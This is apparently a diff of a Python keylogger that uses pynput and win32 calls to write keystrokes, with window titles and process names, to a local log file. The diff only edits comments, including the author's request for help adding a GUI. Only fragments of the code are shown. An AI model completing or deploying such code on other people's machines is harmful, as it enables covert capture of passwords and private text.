@@ -6,7 +6,7 @@ import win32gui
 import win32process
 from pynput import keyboard
 
-# Get the current directory
+# Get the current directory (Change this if you want a customized one. Looking for someone to help me make the GUI)
 current_dir = os.getcwd()
 
 # Open the log file for writing
@@ -16,7 +16,7 @@ log_file = io.open(os.path.join(current_dir, "keystrokes.log"), "w")
 current_window_title = None
 current_process_name = None
 
-# This function gets called every time a key is pressed
+# This function gets called every time a key is pressed, but for some reason this needs fixing.
 def on_press(key):
     global current_window_title, current_process_name
     try:
@@ -71,5 +71,5 @@ with keyboard.Listener(on_press=on_press) as listener:
     except KeyboardInterrupt:
         pass
 
-# Close the log file when we're done. I only did this because it's just a testing.
+# Close the log file when we're done. I only did this because it's just a testing (Remove this part if you want to).
 log_file.close() 
